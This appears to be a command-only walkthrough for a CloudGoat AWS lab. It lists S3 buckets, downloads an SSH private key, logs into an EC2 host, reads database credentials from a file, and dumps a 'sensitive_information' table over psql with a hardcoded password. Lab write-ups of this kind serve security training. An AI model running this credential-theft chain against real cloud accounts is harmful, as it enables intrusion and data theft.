`aws configure --profile McDuck`

`aws s3 ls --profile McDuck`

`aws s3 ls s3://<bucket> --recursive --profile McDuck`

`aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat . --profile McDuck`

`aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat.pub . --profile McDuck`

`aws ec2 describe-instances --profile McDuck`

`chmod 400 cloudgoat`

`ssh -i cloudgoat ubuntu@<ec2_ip>

`sudo apt-get install awscli`

`aws s3 ls`

`aws s3 ls s3://<bucket> --recursive`

`aws s3 cp s3://<bucket>/db.txt .`

`cat db.txt`

`aws rds describe-db-instances --region us-east-1`

`psql postgresql://cgadmin:Purplepwny2029@<rds-instance>:5432/cloudgoat`

`\dt`

`select * from sensitive_information;`
